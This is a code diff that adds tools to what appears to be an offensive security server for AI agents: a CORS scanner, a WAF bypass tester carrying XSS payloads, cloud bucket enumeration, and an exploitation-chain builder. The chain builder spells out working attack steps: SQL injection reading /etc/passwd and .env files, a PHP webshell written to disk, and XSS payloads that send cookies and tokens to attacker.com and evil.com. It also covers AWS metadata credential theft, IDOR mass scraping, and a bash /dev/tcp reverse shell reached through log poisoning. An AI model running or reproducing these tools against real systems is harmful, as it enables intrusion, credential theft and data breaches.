@@ -6677,6 +6677,591 @@ async def enhanced_api_discovery(
 
 
 
+
+# ============================================================================
+# ENHANCED MODULES — PHASE 3: EXPLOITATION & ADVANCED DETECTION
+# ============================================================================
+
+@mcp.tool()
+@resolve_references
+async def enhanced_cors_scanner(
+    target: str,
+    test_credentials: bool = True,
+    test_null_origin: bool = True,
+    test_subdomains: bool = True,
+    timeout: int = 60
+) -> str:
+    """
+    Enhanced CORS misconfiguration scanner.
+    Tests: null origin, wildcard with credentials, subdomain reflection,
+    preflight bypass, Access-Control-Allow-Headers injection.
+    """
+    target = InputValidator.sanitize_target(target)
+    trace, progress, exec_dir = _init_tool_context("enhanced_cors_scanner", target, 6)
+    inputs = {"target": target}
+    
+    url = target if target.startswith("http") else f"https://{target}"
+    domain = target.replace("https://", "").replace("http://", "").split("/")[0]
+    findings = []
+    
+    # Step 1: Baseline CORS headers
+    progress.update("Baseline CORS analysis")
+    baseline_cmd = ["curl", "-skI", "--max-time", "10", "-H", f"Origin: https://evil.com", url]
+    baseline = run_command_advanced(baseline_cmd, timeout=15, trace=trace)
+    headers_lower = baseline.get("stdout", "").lower()
+    
+    if "access-control-allow-origin: *" in headers_lower:
+        findings.append({"type": "WILDCARD_ORIGIN", "severity": "HIGH",
+                        "detail": "CORS allows any origin (*)"})
+    if "access-control-allow-origin: https://evil.com" in headers_lower:
+        findings.append({"type": "ORIGIN_REFLECTION", "severity": "CRITICAL",
+                        "detail": "Origin reflected back - any domain can access resources"})
+    if "access-control-allow-credentials: true" in headers_lower:
+        findings.append({"type": "CREDENTIALS_ALLOWED", "severity": "CRITICAL" if findings else "HIGH",
+                        "detail": "Credentials allowed with permissive origin = full account takeover possible"})
+    
+    # Step 2: Null origin test
+    progress.update("Null origin test")
+    if test_null_origin:
+        null_cmd = ["curl", "-skI", "--max-time", "10", "-H", "Origin: null", url]
+        null_result = run_command_advanced(null_cmd, timeout=15, trace=trace)
+        if "access-control-allow-origin: null" in null_result.get("stdout", "").lower():
+            findings.append({"type": "NULL_ORIGIN_ALLOWED", "severity": "CRITICAL",
+                            "detail": "Null origin accepted - exploitable via sandboxed iframes"})
+    
+    # Step 3: Subdomain reflection
+    progress.update("Subdomain reflection test")
+    if test_subdomains:
+        subdomain_origins = [
+            f"https://evil.{domain}", f"https://{domain}.evil.com",
+            f"https://sub.{domain}", f"https://attacker-{domain}",
+            f"https://{domain}%60attacker.com", f"https://{domain}%2eevil.com",
+        ]
+        for origin in subdomain_origins:
+            sub_cmd = ["curl", "-skI", "--max-time", "8", "-H", f"Origin: {origin}", url]
+            sub_result = run_command_advanced(sub_cmd, timeout=12, trace=trace)
+            response_lower = sub_result.get("stdout", "").lower()
+            if f"access-control-allow-origin: {origin.lower()}" in response_lower:
+                findings.append({"type": "SUBDOMAIN_BYPASS", "severity": "CRITICAL",
+                                "origin": origin,
+                                "detail": f"CORS accepts attacker subdomain: {origin}"})
+                break
+    
+    # Step 4: Preflight method testing
+    progress.update("Preflight analysis")
+    preflight_cmd = ["curl", "-sk", "--max-time", "10", "-X", "OPTIONS",
+                    "-H", "Origin: https://evil.com",
+                    "-H", "Access-Control-Request-Method: PUT",
+                    "-H", "Access-Control-Request-Headers: X-Custom-Header,Authorization",
+                    "-I", url]
+    preflight_result = run_command_advanced(preflight_cmd, timeout=15, trace=trace)
+    preflight_headers = preflight_result.get("stdout", "").lower()
+    
+    if "access-control-allow-methods" in preflight_headers:
+        allowed = ""
+        for line in preflight_result.get("stdout", "").split("\n"):
+            if "access-control-allow-methods" in line.lower():
+                allowed = line.split(":", 1)[1].strip() if ":" in line else ""
+        if any(m in allowed.upper() for m in ["PUT", "DELETE", "PATCH"]):
+            findings.append({"type": "DANGEROUS_METHODS_CORS", "severity": "HIGH",
+                            "methods": allowed,
+                            "detail": f"CORS allows dangerous methods: {allowed}"})
+    
+    if "access-control-allow-headers" in preflight_headers:
+        for line in preflight_result.get("stdout", "").split("\n"):
+            if "access-control-allow-headers" in line.lower():
+                allowed_headers = line.split(":", 1)[1].strip() if ":" in line else ""
+                if "authorization" in allowed_headers.lower():
+                    findings.append({"type": "AUTH_HEADER_CORS", "severity": "HIGH",
+                                    "detail": f"CORS allows Authorization header cross-origin"})
+    
+    # Step 5: Credentials + origin combo (most dangerous)
+    progress.update("Credentials + origin exploit testing")
+    if test_credentials:
+        cred_cmd = ["curl", "-skI", "--max-time", "10",
+                   "-H", "Origin: https://evil.com",
+                   "-H", "Cookie: session=test", url]
+        cred_result = run_command_advanced(cred_cmd, timeout=15, trace=trace)
+        cred_headers = cred_result.get("stdout", "").lower()
+        if ("access-control-allow-credentials: true" in cred_headers and
+            "access-control-allow-origin: https://evil.com" in cred_headers):
+            findings.append({"type": "FULL_CORS_EXPLOIT", "severity": "CRITICAL",
+                            "detail": "CRITICAL: credentials:true + reflected origin = FULL ACCOUNT TAKEOVER",
+                            "exploit": "Attacker can steal authenticated data from any logged-in user"})
+    
+    output = {
+        "status": "success",
+        "target": target,
+        "total_findings": len(findings),
+        "critical_count": len([f for f in findings if f.get("severity") == "CRITICAL"]),
+        "findings": findings,
+        "exploitable": any(f.get("severity") == "CRITICAL" for f in findings),
+        "cors_attack_scenarios": [
+            "1. Host malicious page on attacker domain",
+            "2. Victim visits attacker page while authenticated",
+            "3. JavaScript fetches target API with credentials",
+            "4. Victim's data exfiltrated to attacker server",
+        ] if any(f.get("severity") == "CRITICAL" for f in findings) else [],
+    }
+    
+    output = chain_engine.enrich_with_context("enhanced_cors_scanner", target, output)
+    log_tool_execution("enhanced_cors_scanner", target, inputs, output, trace, progress)
+    return json.dumps(output, indent=2)
+
+
+@mcp.tool()
+@resolve_references
+async def enhanced_waf_bypass(
+    target: str,
+    waf_type: str = "auto",
+    test_payload: str = "<script>alert(1)</script>",
+    timeout: int = 120
+) -> str:
+    """
+    Active WAF bypass testing. Detects WAF type then tests specific bypass techniques.
+    Supports: Cloudflare, AWS WAF, ModSecurity, Imperva, Akamai, F5.
+    Tests: encoding bypass, case variation, unicode, null bytes, HTTP smuggling indicators.
+    """
+    target = InputValidator.sanitize_target(target)
+    trace, progress, exec_dir = _init_tool_context("enhanced_waf_bypass", target, 7)
+    inputs = {"target": target, "waf_type": waf_type, "test_payload": test_payload}
+    
+    url = target if target.startswith("http") else f"https://{target}"
+    findings = []
+    
+    # Step 1: WAF detection
+    progress.update("WAF detection")
+    waf_detected = waf_type
+    if waf_type == "auto":
+        detect_cmd = ["curl", "-skI", "--max-time", "10", f"{url}/?test=<script>alert(1)</script>"]
+        detect_result = run_command_advanced(detect_cmd, timeout=15, trace=trace)
+        response = detect_result.get("stdout", "").lower()
+        
+        if "cf-ray" in response or "server: cloudflare" in response:
+            waf_detected = "cloudflare"
+        elif "x-amzn-waf" in response or "awswaf" in response:
+            waf_detected = "aws_waf"
+        elif "mod_security" in response or "modsecurity" in response:
+            waf_detected = "modsecurity"
+        elif "incap_ses" in response:
+            waf_detected = "imperva"
+        elif "akamai" in response:
+            waf_detected = "akamai"
+        elif "bigip" in response or "x-wa-info" in response:
+            waf_detected = "f5"
+        elif "403" in response or "406" in response:
+            waf_detected = "unknown"
+        else:
+            waf_detected = "none_detected"
+    
+    # Step 2: Get baseline (blocked response)
+    progress.update("Getting baseline blocked response")
+    blocked_cmd = ["curl", "-sk", "--max-time", "10", "-w", "\n%{http_code}|%{size_download}",
+                  f"{url}/?payload={test_payload}"]
+    blocked_result = run_command_advanced(blocked_cmd, timeout=15, trace=trace)
+    blocked_stdout = blocked_result.get("stdout", "")
+    parts = blocked_stdout.rsplit("\n", 1)
+    blocked_meta = parts[-1] if len(parts) > 1 else ""
+    blocked_code = blocked_meta.split("|")[0] if "|" in blocked_meta else ""
+    
+    # Step 3: Bypass techniques
+    progress.update("Testing bypass techniques")
+    bypass_payloads = {
+        "double_url_encode": "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
+        "unicode_bypass": "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
+        "case_variation": "<ScRiPt>alert(1)</ScRiPt>",
+        "null_byte": "<scri%00pt>alert(1)</scri%00pt>",
+        "html_entities": "&#60;script&#62;alert(1)&#60;/script&#62;",
+        "concat_bypass": "<scr"+"ipt>alert(1)</scr"+"ipt>",
+        "svg_bypass": "<svg/onload=alert(1)>",
+        "img_bypass": "<img src=x onerror=alert(1)>",
+        "event_bypass": "<body onload=alert(1)>",
+        "data_uri": "data:text/html,<script>alert(1)</script>",
+        "tab_bypass": "<script\t>alert(1)</script>",
+        "newline_bypass": "<script\n>alert(1)</script>",
+        "comment_bypass": "<script>/**/alert(1)</script>",
+        "backtick_bypass": "<script>alert`1`</script>",
+    }
+    
+    # WAF-specific bypasses
+    if waf_detected == "cloudflare":
+        bypass_payloads.update({
+            "cf_svg": "<svg onload=prompt(1)>",
+            "cf_details": "<details open ontoggle=alert(1)>",
+            "cf_math": "<math><mtext><option><FAKEFAKE><option></option>",
+        })
+    elif waf_detected == "modsecurity":
+        bypass_payloads.update({
+            "modsec_comment": "<!--><script>alert(1)</script-->",
+            "modsec_multiline": "<script>\nalert(1)\n</script>",
+        })
+    
+    successful_bypasses = []
+    failed_bypasses = []
+    
+    for technique, payload in bypass_payloads.items():
+        test_url = f"{url}/?payload={payload}"
+        test_cmd = ["curl", "-sk", "--max-time", "8", "-o", "/dev/null", "-w", "%{http_code}", test_url]
+        result = run_command_advanced(test_cmd, timeout=12, trace=trace)
+        status = result.get("stdout", "").strip()
+        
+        if status == "200" and blocked_code in ["403", "406", "429"]:
+            successful_bypasses.append({
+                "technique": technique, "payload": payload,
+                "status": status, "detail": f"WAF bypassed with {technique}!"
+            })
+        elif status != blocked_code and status not in ["000", ""]:
+            successful_bypasses.append({
+                "technique": technique, "payload": payload,
+                "original_status": blocked_code, "bypass_status": status,
+                "detail": f"Different response ({blocked_code} → {status})"
+            })
+        else:
+            failed_bypasses.append(technique)
+    
+    # Step 4: Header-based bypass
+    progress.update("Header-based WAF bypass")
+    header_bypasses = [
+        ("X-Originating-IP", "127.0.0.1"),
+        ("X-Forwarded-For", "127.0.0.1"),
+        ("X-Remote-IP", "127.0.0.1"),
+        ("X-Original-URL", "/"),
+        ("X-Rewrite-URL", "/"),
+        ("Content-Type", "application/x-www-form-urlencoded"),
+        ("Transfer-Encoding", "chunked"),
+    ]
+    
+    for h_name, h_value in header_bypasses:
+        hdr_url = f"{url}/?payload={test_payload}"
+        hdr_cmd = ["curl", "-sk", "--max-time", "8", "-o", "/dev/null", "-w", "%{http_code}",
+                  "-H", f"{h_name}: {h_value}", hdr_url]
+        result = run_command_advanced(hdr_cmd, timeout=12, trace=trace)
+        status = result.get("stdout", "").strip()
+        if status == "200" and blocked_code in ["403", "406", "429"]:
+            successful_bypasses.append({
+                "technique": f"header_{h_name}", "header": f"{h_name}: {h_value}",
+                "status": status, "detail": f"WAF bypassed with {h_name} header!"
+            })
+    
+    # Step 5: Rate limit testing
+    progress.update("Rate limit detection")
+    rate_limit_info = {}
+    for i in range(5):
+        rl_cmd = ["curl", "-sk", "--max-time", "5", "-o", "/dev/null", "-w", "%{http_code}", url]
+        rl_result = run_command_advanced(rl_cmd, timeout=8, trace=trace)
+        if rl_result.get("stdout", "").strip() == "429":
+            rate_limit_info = {"rate_limited_after": i + 1, "status": "429 detected"}
+            break
+    
+    # Step 6: Summary
+    progress.update("Complete")
+    output = {
+        "status": "success",
+        "target": target,
+        "waf_detected": waf_detected,
+        "blocked_status": blocked_code,
+        "total_bypasses_found": len(successful_bypasses),
+        "successful_bypasses": successful_bypasses,
+        "failed_techniques": len(failed_bypasses),
+        "rate_limit": rate_limit_info,
+        "severity": "CRITICAL" if successful_bypasses else "INFO",
+        "recommendations": [
+            f"WAF ({waf_detected}) has {len(successful_bypasses)} bypass vectors" if successful_bypasses
+            else f"WAF ({waf_detected}) blocked all {len(failed_bypasses)} bypass attempts"
+        ],
+    }
+    
+    output = chain_engine.enrich_with_context("enhanced_waf_bypass", target, output)
+    log_tool_execution("enhanced_waf_bypass", target, inputs, output, trace, progress)
+    return json.dumps(output, indent=2)
+
+
+@mcp.tool()
+@resolve_references
+async def cloud_storage_enum(
+    target: str,
+    cloud_provider: str = "auto",
+    custom_prefixes: str = "",
+    timeout: int = 120
+) -> str:
+    """
+    Cloud storage bucket/blob enumeration.
+    Tests: AWS S3, Google Cloud Storage, Azure Blob Storage.
+    Discovers: publicly accessible buckets, listing enabled, sensitive files exposed.
+    """
+    target = InputValidator.sanitize_target(target)
+    trace, progress, exec_dir = _init_tool_context("cloud_storage_enum", target, 5)
+    inputs = {"target": target, "cloud_provider": cloud_provider}
+    
+    domain = target.replace("https://", "").replace("http://", "").split("/")[0]
+    base_name = domain.split(".")[0]
+    findings = []
+    
+    # Generate bucket name variants
+    progress.update("Generating bucket name variants")
+    prefixes = [base_name]
+    if custom_prefixes:
+        prefixes.extend([p.strip() for p in custom_prefixes.split(",")])
+    
+    variants = []
+    suffixes = ["", "-backup", "-bak", "-prod", "-production", "-staging", "-stage",
+                "-dev", "-development", "-test", "-data", "-assets", "-static",
+                "-uploads", "-media", "-logs", "-private", "-public", "-internal",
+                "-archive", "-dump", "-export", "-db", "-database"]
+    
+    for prefix in prefixes:
+        for suffix in suffixes:
+            variants.append(f"{prefix}{suffix}")
+    
+    # Step 2: Test S3 buckets
+    progress.update("Testing AWS S3 buckets")
+    if cloud_provider in ["auto", "aws"]:
+        for bucket in variants[:30]:
+            s3_url = f"https://{bucket}.s3.amazonaws.com/"
+            s3_cmd = ["curl", "-sk", "--max-time", "5", "-o", "/dev/null", "-w", "%{http_code}", s3_url]
+            result = run_command_advanced(s3_cmd, timeout=8, trace=trace)
+            status = result.get("stdout", "").strip()
+            
+            if status == "200":
+                # Try to list contents
+                list_cmd = ["curl", "-sk", "--max-time", "8", s3_url]
+                list_result = run_command_advanced(list_cmd, timeout=12, trace=trace)
+                has_listing = "<ListBucketResult" in list_result.get("stdout", "")
+                findings.append({
+                    "type": "S3_BUCKET_PUBLIC", "severity": "CRITICAL" if has_listing else "HIGH",
+                    "bucket": bucket, "url": s3_url, "listing_enabled": has_listing,
+                    "detail": f"Public S3 bucket: {bucket}" + (" (LISTING ENABLED!)" if has_listing else "")
+                })
+            elif status == "403":
+                findings.append({
+                    "type": "S3_BUCKET_EXISTS", "severity": "LOW",
+                    "bucket": bucket, "detail": f"S3 bucket exists but access denied: {bucket}"
+                })
+    
+    # Step 3: Test GCS buckets
+    progress.update("Testing Google Cloud Storage")
+    if cloud_provider in ["auto", "gcp"]:
+        for bucket in variants[:20]:
+            gcs_url = f"https://storage.googleapis.com/{bucket}/"
+            gcs_cmd = ["curl", "-sk", "--max-time", "5", "-o", "/dev/null", "-w", "%{http_code}", gcs_url]
+            result = run_command_advanced(gcs_cmd, timeout=8, trace=trace)
+            status = result.get("stdout", "").strip()
+            
+            if status == "200":
+                findings.append({
+                    "type": "GCS_BUCKET_PUBLIC", "severity": "CRITICAL",
+                    "bucket": bucket, "url": gcs_url,
+                    "detail": f"Public GCS bucket: {bucket}"
+                })
+    
+    # Step 4: Test Azure Blob Storage
+    progress.update("Testing Azure Blob Storage")
+    if cloud_provider in ["auto", "azure"]:
+        for bucket in variants[:20]:
+            azure_url = f"https://{bucket}.blob.core.windows.net/?comp=list"
+            azure_cmd = ["curl", "-sk", "--max-time", "5", "-o", "/dev/null", "-w", "%{http_code}", azure_url]
+            result = run_command_advanced(azure_cmd, timeout=8, trace=trace)
+            status = result.get("stdout", "").strip()
+            
+            if status == "200":
+                findings.append({
+                    "type": "AZURE_BLOB_PUBLIC", "severity": "CRITICAL",
+                    "container": bucket, "url": azure_url,
+                    "detail": f"Public Azure Blob container: {bucket}"
+                })
+    
+    progress.update("Complete")
+    output = {
+        "status": "success",
+        "target": target,
+        "domain": domain,
+        "variants_tested": len(variants[:30]),
+        "total_findings": len(findings),
+        "public_buckets": [f for f in findings if "PUBLIC" in f.get("type", "")],
+        "existing_buckets": [f for f in findings if "EXISTS" in f.get("type", "")],
+        "all_findings": findings,
+    }
+    
+    output = chain_engine.enrich_with_context("cloud_storage_enum", target, output)
+    log_tool_execution("cloud_storage_enum", target, inputs, output, trace, progress)
+    return json.dumps(output, indent=2)
+
+
+@mcp.tool()
+@resolve_references
+async def exploitation_chain(
+    target: str,
+    chain_type: str = "auto",
+    timeout: int = 180
+) -> str:
+    """
+    Automatic exploitation chain builder. Analyzes prior tool results and builds
+    exploitation chains:
+    - SSRF + AWS metadata → credential extraction
+    - SQLi + file read → source code disclosure
+    - IDOR + API → mass data dump strategy
+    - XSS + CORS → session hijack chain
+    - LFI + log poisoning → RCE
+    Chain types: auto, ssrf_to_creds, sqli_to_rce, idor_to_dump, xss_to_takeover, lfi_to_rce
+    """
+    target = InputValidator.sanitize_target(target)
+    trace, progress, exec_dir = _init_tool_context("exploitation_chain", target, 6)
+    inputs = {"target": target, "chain_type": chain_type}
+    
+    # Step 1: Gather context from prior tool runs
+    progress.update("Gathering context from tool chain")
+    context = chain_engine.get_target_context(target) if hasattr(chain_engine, 'get_target_context') else {}
+    
+    # Analyze available data
+    has_ssrf = any("ssrf" in str(v).lower() for v in context.values()) if context else False
+    has_sqli = any("sqli" in str(v).lower() or "sql_injection" in str(v).lower() for v in context.values()) if context else False
+    has_idor = any("idor" in str(v).lower() for v in context.values()) if context else False
+    has_xss = any("xss" in str(v).lower() for v in context.values()) if context else False
+    has_lfi = any("lfi" in str(v).lower() for v in context.values()) if context else False
+    has_cors = any("cors" in str(v).lower() for v in context.values()) if context else False
+    
+    chains = []
+    
+    # Step 2: Build exploitation chains
+    progress.update("Building exploitation chains")
+    
+    if chain_type in ["auto", "ssrf_to_creds"] and (has_ssrf or chain_type == "ssrf_to_creds"):
+        chains.append({
+            "name": "SSRF → AWS Credential Extraction",
+            "severity": "CRITICAL",
+            "steps": [
+                {"step": 1, "action": "Confirm SSRF via enhanced_ssrf_scanner",
+                 "target": "Identified SSRF parameter"},
+                {"step": 2, "action": "Access http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                 "target": "AWS metadata service"},
+                {"step": 3, "action": "Extract AccessKeyId, SecretAccessKey, Token",
+                 "target": "IAM role credentials"},
+                {"step": 4, "action": "Use aws-cli with extracted credentials",
+                 "command": "aws sts get-caller-identity"},
+                {"step": 5, "action": "Enumerate S3, EC2, Lambda access",
+                 "command": "aws s3 ls / aws ec2 describe-instances"},
+            ],
+            "impact": "Full AWS account compromise via SSRF → IAM credential theft",
+            "prereqs": ["Confirmed SSRF vulnerability", "AWS infrastructure"],
+        })
+    
+    if chain_type in ["auto", "sqli_to_rce"] and (has_sqli or chain_type == "sqli_to_rce"):
+        chains.append({
+            "name": "SQLi → File Read → Source Disclosure → RCE",
+            "severity": "CRITICAL",
+            "steps": [
+                {"step": 1, "action": "Confirm SQLi via sqlmap_scan or sql_injection_test",
+                 "target": "Injectable parameter"},
+                {"step": 2, "action": "Read sensitive files via LOAD_FILE()",
+                 "payload": "' UNION SELECT LOAD_FILE('/etc/passwd')--"},
+                {"step": 3, "action": "Read application config for DB credentials",
+                 "payload": "' UNION SELECT LOAD_FILE('/var/www/html/.env')--"},
+                {"step": 4, "action": "Write webshell via INTO OUTFILE",
+                 "payload": "' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/shell.php'--"},
+                {"step": 5, "action": "Execute commands via webshell",
+                 "command": "curl target.com/shell.php?c=whoami"},
+            ],
+            "impact": "Full Remote Code Execution via SQL Injection chain",
+            "prereqs": ["Confirmed SQL injection", "FILE privilege on DB user"],
+        })
+    
+    if chain_type in ["auto", "idor_to_dump"] and (has_idor or chain_type == "idor_to_dump"):
+        chains.append({
+            "name": "IDOR → Mass Data Extraction",
+            "severity": "HIGH",
+            "steps": [
+                {"step": 1, "action": "Confirm IDOR via enhanced_idor_scanner",
+                 "target": "Vulnerable endpoint with sequential/predictable IDs"},
+                {"step": 2, "action": "Enumerate valid IDs (sequential, UUID patterns)",
+                 "detail": "Iterate through ID range: 1-10000"},
+                {"step": 3, "action": "Extract data for each valid ID",
+                 "command": "for i in $(seq 1 10000); do curl -s 'target.com/api/users/$i'; done"},
+                {"step": 4, "action": "Parse and aggregate extracted data",
+                 "detail": "Combine all responses into structured dataset"},
+                {"step": 5, "action": "Identify high-value targets (admin, PII)",
+                 "detail": "Filter for admin roles, emails, phone numbers"},
+            ],
+            "impact": "Mass data breach via IDOR - all user data accessible",
+            "prereqs": ["Confirmed IDOR vulnerability", "Predictable ID pattern"],
+        })
+    
+    if chain_type in ["auto", "xss_to_takeover"] and (has_xss or has_cors or chain_type == "xss_to_takeover"):
+        chains.append({
+            "name": "XSS + CORS → Account Takeover",
+            "severity": "CRITICAL",
+            "steps": [
+                {"step": 1, "action": "Confirm stored/reflected XSS",
+                 "target": "XSS injection point"},
+                {"step": 2, "action": "Craft credential-stealing payload",
+                 "payload": "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"},
+                {"step": 3, "action": "If CORS misconfigured, exploit cross-origin",
+                 "detail": "Host payload on attacker domain, steal authenticated API data"},
+                {"step": 4, "action": "Steal session tokens / JWT",
+                 "payload": "<script>fetch('/api/me').then(r=>r.json()).then(d=>fetch('https://evil.com/?d='+btoa(JSON.stringify(d))))</script>"},
+                {"step": 5, "action": "Replay stolen tokens for account takeover",
+                 "command": "curl -H 'Authorization: Bearer STOLEN_TOKEN' target.com/api/admin"},
+            ],
+            "impact": "Full account takeover via XSS → session theft → impersonation",
+            "prereqs": ["Confirmed XSS", "Session tokens in cookies/localStorage"],
+        })
+    
+    if chain_type in ["auto", "lfi_to_rce"] and (has_lfi or chain_type == "lfi_to_rce"):
+        chains.append({
+            "name": "LFI + Log Poisoning → RCE",
+            "severity": "CRITICAL",
+            "steps": [
+                {"step": 1, "action": "Confirm LFI via lfi_scan",
+                 "target": "File inclusion parameter"},
+                {"step": 2, "action": "Identify readable log files",
+                 "paths": ["/var/log/apache2/access.log", "/var/log/nginx/access.log"]},
+                {"step": 3, "action": "Poison log with PHP code via User-Agent",
+                 "command": "curl -A '<?php system($_GET[c]);?>' target.com"},
+                {"step": 4, "action": "Include poisoned log via LFI",
+                 "payload": "?file=../../../var/log/apache2/access.log&c=whoami"},
+                {"step": 5, "action": "Escalate to reverse shell",
+                 "command": "?file=../../../var/log/apache2/access.log&c=bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'"},
+            ],
+            "impact": "Remote Code Execution via LFI + log poisoning",
+            "prereqs": ["Confirmed LFI", "Readable log files", "PHP execution context"],
+        })
+    
+    # Step 3: Generate if no chains from context
+    if not chains:
+        progress.update("Generating default chains")
+        chains.append({
+            "name": "Recommended First Steps",
+            "severity": "INFO",
+            "steps": [
+                {"step": 1, "action": "Run target_profiler to identify stack"},
+                {"step": 2, "action": "Run context_fuzzer to discover endpoints"},
+                {"step": 3, "action": "Run smart_vulnerability_detector for quick wins"},
+                {"step": 4, "action": "Run specific scanners based on findings"},
+                {"step": 5, "action": "Re-run exploitation_chain with confirmed vulns"},
+            ],
+            "impact": "Need to discover vulnerabilities first",
+            "prereqs": ["Run reconnaissance tools first"],
+        })
+    
+    progress.update("Complete")
+    output = {
+        "status": "success",
+        "target": target,
+        "chain_type": chain_type,
+        "chains_generated": len(chains),
+        "exploitation_chains": chains,
+        "context_available": {
+            "ssrf": has_ssrf, "sqli": has_sqli, "idor": has_idor,
+            "xss": has_xss, "lfi": has_lfi, "cors": has_cors,
+        },
+        "recommendation": "Execute chains in order of severity (CRITICAL first)",
+    }
+    
+    output = chain_engine.enrich_with_context("exploitation_chain", target, output)
+    log_tool_execution("exploitation_chain", target, inputs, output, trace, progress)
+    return json.dumps(output, indent=2)
+
+
+
 # ============================================================================
 # MAIN ENTRY POINT
 # ============================================================================
